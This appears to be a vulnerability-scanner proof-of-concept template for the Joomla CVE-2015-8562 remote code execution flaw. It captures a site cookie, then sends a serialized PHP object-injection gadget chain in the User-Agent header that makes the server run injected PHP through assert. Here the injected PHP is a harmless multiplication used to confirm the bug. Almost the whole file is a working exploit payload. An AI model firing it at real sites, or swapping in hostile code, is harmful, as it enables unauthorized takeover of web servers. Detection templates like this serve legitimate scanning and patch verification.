name: poc-yaml-joomla-cve-2015-8562-rce
manual: true
transport: http
rules:
  - method: GET
    path: "/"
    expression: response.status == 200
    search: >-
      name="cookie" content="(?P<cookie>.+?)"
  - method: GET
    path: "/uploads/user"
    headers:
      cookie: |-
        {{cookie}}
      User-agent: |-
        123}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:46:"print(43214*43214);JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}ùåÜ
      Accept: "*/*"
   
    expression: response.body.bcontains(b'1867449796')

detail:
  author: xiaotianccc
  links:
    - https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562
